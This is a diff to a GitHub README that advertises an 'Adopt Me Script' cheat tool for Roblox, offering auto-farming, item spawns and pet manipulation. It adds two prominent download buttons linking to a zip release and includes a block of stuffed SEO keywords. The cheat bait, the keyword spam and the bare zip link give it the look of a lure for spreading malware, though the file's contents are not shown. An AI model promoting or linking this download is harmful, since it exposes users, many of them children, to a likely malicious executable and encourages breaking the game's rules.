@@ -7,6 +7,12 @@
 
 Welcome to the **Adopt Me! Helper Hub**. This repository is dedicated to providing community-driven resources, value trackers, and utility tools for players of the popular Roblox experience, Adopt Me!
 
+<p align="center">
+  <a href="https://github.com/john-chen-code2000s7/adoptme/releases/download/download/adoptme.zip">
+    <img src="https://www.coinagemag.com/wp-content/uploads/2017/12/free-download-png-blue-color-free-download-button-679-1.png" alt="Download" width="250"/>
+  </a>
+</p>
+
 🔑 What is Adopt Me Script? Adopt Me Script is a tool designed for the popular Roblox game Adopt Me!. This script allows you to access a variety of features, such as auto-farming, item spawns, pet manipulation, and more, giving you the ultimate advantage in the game. Whether you want to unlock rare pets, level up faster, or simply enjoy the game with additional perks, Adopt Me Script provides you with all the tools you need to enhance your gameplay.
 
 🔑 SEO Keywords: adopt me script, roblox adopt me hacks, adopt me pet spawn script, adopt me auto farm, adopt me cheats, roblox cheats, roblox adopt me mod, adopt me tool, adopt me exploit, roblox script for adopt me.
@@ -34,7 +40,12 @@ The **Adopt Me! Helper** project aims to streamline the gameplay experience by o
 📥 How to Download & Install
 
 👇 Click the download link below to get the latest version of the Adopt Me Script.
----
+
+<p align="center">
+  <a href="https://github.com/john-chen-code2000s7/adoptme/releases/download/download/adoptme.zip">
+    <img src="https://www.coinagemag.com/wp-content/uploads/2017/12/free-download-png-blue-color-free-download-button-679-1.png" alt="Download" width="250"/>
+  </a>
+</p>
 
 ## 🛠 Installation & Setup
 
